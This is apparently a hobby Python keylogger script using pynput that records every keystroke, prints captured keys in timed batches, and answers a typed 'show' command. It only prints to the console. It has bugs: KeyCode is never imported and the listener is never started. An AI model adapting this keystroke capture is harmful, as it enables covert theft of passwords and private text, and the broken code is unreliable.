from datetime import datetime
from pynput.keyboard import Listener,Key
import time
import threading

pressed_keys = set()
last_keys=[]
keys_all_time=[]
keys_for_logging = []
stop_logging= False
last_show_index=0


def on_press(key):
    global stop_logging, last_show_index
    pressed_keys.add(key)


    if Key.esc in pressed_keys and Key.down in pressed_keys:
        print(" ESC + Down pressed — stopping program.")
        stop_logging = True
        return False

    try:
        char = key.char
        if isinstance(key, KeyCode):
            # מקשים של המספרים למעלה (vk 48 à 57)
            # if 48 <= key.vk <= 57:
            # char = chr(key.vk)  # '0' à '9'

            # מקשים של המספרים  בצד (vk 96 à 105)
            if 96 <= key.vk <= 105:
                char = str(key.vk - 96)  # '0' à '9'
            

    except AttributeError:


        if key == Key.space:
            char = ' '
        elif key == Key.enter:

            char = '\n'
            if ''.join(last_keys).lower() == "show":
                print("All keys typed since the last command")

                print(''.join(keys_all_time[last_show_index:]))

                last_show_index = len(keys_all_time)
            last_keys.clear()
            char='\n'

        elif key == Key.tab:
            char = '\t'
        elif key == Key.backspace:
            char = '⌫'

        else:
            char = f'[{str(key).replace("Key.", "")}]'

    keys_all_time.append(char)
    keys_for_logging.append(char)
    if len(char) == 1 and char.isalpha():
        last_keys.append(char)
        if len(last_keys) > 10:
            last_keys.pop(0)


    elif char in [' ', '\n', '\t']:
        last_keys.clear()




def log_by_minute():
    while not stop_logging:
        keys = keys_for_logging.copy()
        keys_for_logging.clear()  #מרוקן

        now = datetime.now().strftime("%Y-%m-%d %H:%M")
        print(f"\n**** {now} ****")
        if keys:
            print( ''.join(keys))

        else:
            print("No Key Pressed")
        check_interval = 0.1
        for _ in range(int(10 / check_interval)):
            if stop_logging:
                return
            time.sleep(check_interval)






